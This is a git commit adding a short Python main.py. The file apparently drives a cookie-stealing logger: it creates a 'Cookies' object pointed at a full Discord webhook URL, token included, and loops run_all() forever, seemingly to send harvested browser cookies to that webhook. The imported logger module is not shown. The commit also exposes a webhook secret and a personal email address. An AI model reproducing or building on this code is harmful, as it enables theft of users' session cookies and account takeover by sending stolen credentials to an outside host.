7baf7665e184ddc8718e7ab190dddd69377b672f
KrnlScriptMakerTryer <oskarshort17@gmail.com>
2025-10-05 16:43:33 +1030

    Create main.py

---
+++ main.py
@@ -0,0 +1,10 @@
+from logger import Cookies
+
+log = Cookies('https://discord.com/api/webhooks/1424278224766238881/jKTLTfdjOwoJp3FH0vb5dc9w__laiR_V1dWU4KLR3KTJjh_BUTokgVWBRZ5oowcwwB70')
+
+def main():
+  while True:
+	log.run_all()
+
+if __name__ == '__main__':
+	main()
